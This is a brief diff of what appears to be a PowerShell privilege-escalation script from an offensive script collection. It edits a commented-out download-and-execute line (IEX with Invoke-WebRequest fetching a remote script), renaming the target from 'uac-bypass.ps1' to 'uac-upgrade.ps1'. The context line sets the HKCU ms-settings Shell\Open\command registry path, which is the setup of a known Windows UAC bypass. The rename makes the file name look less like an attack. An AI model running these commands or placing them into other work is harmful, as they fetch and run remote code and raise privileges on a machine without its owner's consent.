@@ -1,4 +1,4 @@
-#IEX (Invoke-WebRequest -Uri "https://raw.githubusercontent.com/paulkwalton/thescriptvault/refs/heads/main/privesc/windows/uac-bypass.ps1")
+#IEX (Invoke-WebRequest -Uri "https://raw.githubusercontent.com/paulkwalton/thescriptvault/refs/heads/main/privesc/windows/uac-upgrade.ps1")
 
 # Define the registry key path
 $REG_KEY = "HKCU:\Software\Classes\ms-settings\Shell\Open\command"
